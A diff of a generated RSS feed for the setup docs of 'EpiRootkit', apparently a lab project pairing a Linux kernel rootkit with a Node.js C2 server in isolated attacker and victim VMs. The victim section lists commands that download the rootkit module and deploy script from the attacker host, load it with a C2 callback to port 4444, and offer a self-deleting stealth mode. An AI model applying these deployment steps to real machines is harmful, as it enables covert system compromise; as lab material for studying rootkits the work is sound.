@@ -1,7 +1,84 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Setup on Tux Fan Club Docs</title><link>/docs/02-setup/</link><description>Recent content in Setup on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 20:52:51 +0200</lastBuildDate><atom:link href="/docs/02-setup/index.xml" rel="self" type="application/rss+xml"/><item><title>Initial Setup &amp; Installation</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup-from-a-blank-system">Host Environment Setup (from a Blank System) &lt;a href="#host-environment-setup-from-a-blank-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Setup on Tux Fan Club Docs</title><link>/docs/02-setup/</link><description>Recent content in Setup on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 31 May 2025 18:51:21 +0200</lastBuildDate><atom:link href="/docs/02-setup/index.xml" rel="self" type="application/rss+xml"/><item><title>Host Environment Setup</title><link>/docs/02-setup/environment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/environment/</guid><description>&lt;h1 id="host-environment-setup">Host Environment Setup &lt;a href="#host-environment-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Purpose:&lt;/strong> Configure Ubuntu 24.10 host to run attacker and victim VMs. The actual EpiRootkit components run INSIDE the VMs.&lt;/p>
 &lt;/blockquote>
-&lt;h2 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="acfbedTab" data-bs-toggle="tab" data-bs-target="#acfbed"
+		 type="button" role="tab" aria-controls="acfbed" aria-selected="true">Automated Setup (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="afecbdTab" data-bs-toggle="tab" data-bs-target="#afecbd"
+		 type="button" role="tab" aria-controls="afecbd" aria-selected="true">Manual Step-by-Step&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="acfbed" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Run the automated setup script to install all dependencies:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="6debccf" class="language-bash ">
+ &lt;code>./scripts/install_dependencies.sh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>What it installs:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>QEMU/KVM&lt;/strong>: Virtual machine hypervisor&lt;/li>
+&lt;li>&lt;strong>libvirt&lt;/strong>: VM management daemon and tools&lt;/li>
+&lt;li>&lt;strong>Bridge utils&lt;/strong>: Network bridge configuration&lt;/li>
+&lt;li>&lt;strong>User permissions&lt;/strong>: Adds you to libvirt group&lt;/li>
+&lt;/ul>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="afecbd" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="1-update-system">1. Update System &lt;a href="#1-update-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -20,8 +97,7 @@
  &lt;code>sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="2-install-essential-packages">2. Install Essential Packages &lt;a href="#2-install-essential-packages" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Install all required tools for virtualization, development, and Node.js:&lt;/p>
-
+&lt;h3 id="2-install-vm-management-tools">2. Install VM Management Tools &lt;a href="#2-install-vm-management-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -36,13 +112,65 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b8ce25f" class="language-bash ">
- &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm&lt;/code>
+ &lt;pre id="9f50dab" class="language-bash ">
+ &lt;code>sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;blockquote>
-&lt;p>&lt;strong>Tip:&lt;/strong> If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use &lt;code>uname -r&lt;/code> and &lt;code>apt search linux-headers&lt;/code> to check.&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
+&lt;h3 id="3-configure-libvirt">3. Configure Libvirt &lt;a href="#3-configure-libvirt" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d6a02f1" class="language-bash ">
+ &lt;code># Enable and start libvirt daemon
+sudo systemctl enable --now libvirtd
+
+# Add current user to libvirt group
+sudo usermod -aG libvirt $USER
+
+# Activate group membership (required before using VMs)
+newgrp libvirt&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="4-optional-documentation-tools">4. Optional: Documentation Tools &lt;a href="#4-optional-documentation-tools" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="960483f" class="language-bash ">
+ &lt;code># Only if you want to build docs locally
+sudo apt install -y hugo&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+&lt;/div>
+&lt;h2 id="verification">Verification &lt;a href="#verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>After completing either setup method, verify your installation:&lt;/p></description></item><item><title>VM Installation &amp; Verification</title><link>/docs/02-setup/vm-installation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/vm-installation/</guid><description>&lt;h1 id="virtual-machine-installation--verification">Virtual Machine Installation &amp;amp; Verification &lt;a href="#virtual-machine-installation--verification" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>You must have completed &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Host Environment Setup&lt;/strong>&lt;br>Prepare your host system for running EpiRootkit VMs&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Initial Setup &amp;amp; Installation&lt;/a> before proceeding.&lt;/strong>&lt;/p>
 &lt;/blockquote>
 &lt;h2 id="1-choose-your-vm-setup-method">1. Choose Your VM Setup Method &lt;a href="#1-choose-your-vm-setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
@@ -56,14 +184,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="facbdeTab" data-bs-toggle="tab" data-bs-target="#facbde"
-		 type="button" role="tab" aria-controls="facbde" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="dfbceaTab" data-bs-toggle="tab" data-bs-target="#dfbcea"
+		 type="button" role="tab" aria-controls="dfbcea" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="fcdabeTab" data-bs-toggle="tab" data-bs-target="#fcdabe"
-		 type="button" role="tab" aria-controls="fcdabe" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="dcbfeaTab" data-bs-toggle="tab" data-bs-target="#dcbfea"
+		 type="button" role="tab" aria-controls="dcbfea" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -80,114 +208,336 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="facbde" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="dfbcea" role="tabpanel" aria-labelledby="nav-1">
 
-	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
-&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>Ensure the &lt;code>attacker.qcow2&lt;/code> disk is in the &lt;code>vm/&lt;/code> directory (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/li>
-&lt;li>Launch the attacking VM with:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="b9b360f" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>
- &lt;/pre>
- &lt;/div>
-Or both VMs with:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="fc8077c" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>On the attacking VM:
-&lt;ul>
-&lt;li>Auto-login is enabled for user &lt;code>attacker&lt;/code> (no password prompt).&lt;/li>
-&lt;li>The static IP is &lt;strong>192.168.200.11&lt;/strong>.&lt;/li>
-&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
-&lt;/ul>
-&lt;/li>
+	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h1 id="attacker-vm-setup">Attacker VM Setup &lt;a href="#attacker-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Configure the attacking VM with Node.js C2 server and React web interface.&lt;/p>
+&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/attacker.qcow2&lt;/code> in project root&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>&lt;/li>
 &lt;/ol>
-&lt;p>For more details on the network configuration and helper scripts, see &lt;a href="/docs/02-setup/environment/#how-it-works">Initial Setup &amp;amp; Installation&lt;/a>.&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
-&lt;ol>
-&lt;li>
-&lt;p>Place the &lt;code>victim.qcow2&lt;/code> disk in the &lt;code>vm/&lt;/code> directory at the project root (verify via &lt;code>./scripts/check_vms.sh&lt;/code> or see &lt;a href="/docs/02-setup/vm-installation/">VM Installation &amp;amp; Verification&lt;/a>).&lt;/p>
-&lt;/li>
-&lt;li>
-&lt;p>Launch the victim VM with:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="39be92f" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>Or both VMs with:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="fc8077c" class="language-bash ">
- &lt;code>sudo ./scripts/run_vms.sh&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>
-&lt;p>On the victim VM:&lt;/p>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
 &lt;ul>
-&lt;li>The VM has auto-login enabled for the &lt;code>victim&lt;/code> user (no password prompt).&lt;/li>
-&lt;li>Its static IP is &lt;strong>192.168.200.10&lt;/strong>.&lt;/li>
-&lt;li>The password is &lt;code>jules&lt;/code>.&lt;/li>
+&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.11 (static)&lt;/li>
+&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>attacker&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Auto-login&lt;/strong>: Enabled (no password prompt)&lt;/li>
 &lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item></channel></rss>
+&lt;h2 id="setup-method">Setup Method &lt;a href="#setup-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="edabcfTab" data-bs-toggle="tab" data-bs-target="#edabcf"
+		 type="button" role="tab" aria-controls="edabcf" aria-selected="true">Pre-built Disk (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="cdaefbTab" data-bs-toggle="tab" data-bs-target="#cdaefb"
+		 type="button" role="tab" aria-controls="cdaefb" aria-selected="true">Self-build from Scratch&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="edabcf" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is already set up, so you can immediately build and run:&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h1 id="victim-vm-setup">Victim VM Setup &lt;a href="#victim-vm-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Deploy the EpiRootkit kernel module on the victim system.&lt;/p>
+&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Host setup complete&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;strong>VM downloaded&lt;/strong>: &lt;code>vm/victim.qcow2&lt;/code> in project root&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Connection Details:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>IP Address&lt;/strong>: 192.168.200.10 (static)&lt;/li>
+&lt;li>&lt;strong>Username&lt;/strong>: &lt;code>victim&lt;/code> / &lt;strong>Password&lt;/strong>: &lt;code>jules&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS with kernel 5.4.0&lt;/li>
+&lt;/ul>
+&lt;h2 id="deployment-process">Deployment Process &lt;a href="#deployment-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-receive-payload">1. Receive Payload &lt;a href="#1-receive-payload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Get the rootkit files from the attacker VM:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="e9a67ad" class="language-bash ">
+ &lt;code># Option A: HTTP download
+wget http://192.168.200.11:8080/epirootkit.ko
+wget http://192.168.200.11:8080/deploy_rootkit.sh
+
+# Option B: SCP transfer
+# Files transferred by attacker to victim@192.168.200.10:~/
+
+# Option C: Web UI upload
+# Use attacker&amp;#39;s web interface file transfer panel&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="2-deploy-rootkit">2. Deploy Rootkit &lt;a href="#2-deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="623a725" class="language-bash ">
+ &lt;code># Simple deployment (connects to 192.168.200.11:4444)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh address=IP port=PORT
+
+# Stealth deployment (self-destructs)
+sudo ./deploy_rootkit.sh --self-delete&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="3-verify-connection">3. Verify Connection &lt;a href="#3-verify-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Switch to attacker VM C2 server:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h1 id="host-to-vm-file-transfer">Host to VM File Transfer &lt;a href="#host-to-vm-file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Guide for transferring files from the host system to QEMU virtual machines.&lt;/p>
+&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="cadebfTab" data-bs-toggle="tab" data-bs-target="#cadebf"
+		 type="button" role="tab" aria-controls="cadebf" aria-selected="true">Automated Script (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="bfdceaTab" data-bs-toggle="tab" data-bs-target="#bfdcea"
+		 type="button" role="tab" aria-controls="bfdcea" aria-selected="true">Manual SCP/SSH&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="cdabefTab" data-bs-toggle="tab" data-bs-target="#cdabef"
+		 type="button" role="tab" aria-controls="cdabef" aria-selected="true">HTTP Server&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="fbceadTab" data-bs-toggle="tab" data-bs-target="#fbcead"
+		 type="button" role="tab" aria-controls="fbcead" aria-selected="true">Other Methods&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="cadebf" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup, use the automated deployment script:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="aecd187" class="language-bash ">
+ &lt;code># From host project directory
+./scripts/deploy_to_attacker.sh
+
+# ✅ Transfers entire project via SSH/SCP
+# ✅ Runs setup script remotely
+# ✅ Installs all dependencies
+# 🎉 Ready to build and start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="what-it-does">What It Does &lt;a href="#what-it-does" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Checks connectivity&lt;/strong>: VM reachable via SSH&lt;/li>
+&lt;li>&lt;strong>Transfers files&lt;/strong>: Complete project to &lt;code>~/epirootkit&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Runs setup&lt;/strong>: Executes dependency installation&lt;/li>
+&lt;li>&lt;strong>Verifies&lt;/strong>: All components ready&lt;/li>
+&lt;/ol>
+&lt;h3 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>VM running with SSH enabled&lt;/li>
+&lt;li>Network connectivity between host and VM&lt;/li>
+&lt;li>VM credentials: &lt;code>attacker@192.168.200.11&lt;/code> (password: &lt;code>jules&lt;/code>)&lt;/li>
+&lt;/ul>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="bfdcea" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="enable-ssh-in-vm">Enable SSH in VM &lt;a href="#enable-ssh-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="882694e" class="language-bash ">
+ &lt;code># Inside the VM
+sudo apt update &amp;amp;&amp;amp; sudo apt install -y openssh-server
+sudo systemctl enable --now ssh&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="transfer-files">Transfer Files &lt;a href="#transfer-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="571da82" class="language-bash ">
+ &lt;code># From host to VM
+scp -r /path/to/epirootkit attacker@192.168.200.11:~/
+scp -r /path/to/epirootkit victim@192.168.200.10:~/
+
+# Transfer specific files
+scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="cdabef" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="setup-server-on-host">Setup Server on Host &lt;a href="#setup-server-on-host" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d380407" class="language-bash ">
+ &lt;code># From project directory
+cd /path/to/epirootkit
+python3 -m http.server 8080&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="download-in-vm">Download in VM &lt;a href="#download-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c335b2d" class="language-bash ">
+ &lt;code># Inside VM
+wget http://192.168.200.1:8080/filename
+
+# Download entire project
+wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="fbcead" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="shared-folders-development">Shared Folders (Development) &lt;a href="#shared-folders-development" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Add to QEMU launch:&lt;/p></description></item></channel></rss>
